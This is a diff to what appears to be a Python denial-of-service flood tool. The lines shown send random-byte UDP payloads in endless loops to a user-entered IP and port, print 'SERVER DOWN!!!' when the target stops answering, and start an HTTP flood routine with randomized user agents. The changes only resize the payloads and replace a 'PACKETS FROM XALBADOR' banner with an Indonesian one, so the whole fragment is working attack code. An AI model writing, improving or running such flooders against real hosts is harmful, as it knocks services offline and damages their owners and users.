@@ -48,7 +48,7 @@ times = int(input("[ ====> ] PACKETS : "))
 threads = int(input("[ ====> ] ISI PACKETS : "))
 os.system("clear")
 def run():
-	data = random._urandom(1800)
+	data = random._urandom(1010)
 	i = random.choice(("[•]","[•]","[•]"))
 	while True:
 		try:
@@ -56,7 +56,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" PACKETS FROM XALBADOR!!!")
+			print(i +" PACKET NIH DATANG!!!")
 		except:
 			s.close()
 			print("[!] SERVER DOWN!!!")
@@ -70,7 +70,7 @@ def run2():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" PACKETS FROM XALBADOR!!!")
+			print(i +" PACKET NIH DATANG!!!")
 		except:
 			s.close()
 			print("[!] SERVER DOWN!!!")
@@ -78,7 +78,7 @@ def run2():
 			
 def run3():
     global useragents, ref, acceptall
-    hh = random._urandom(1025)
+    hh = random._urandom(1010)
     xx = int(0)
     useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
     accept = random.choice(acceptall)
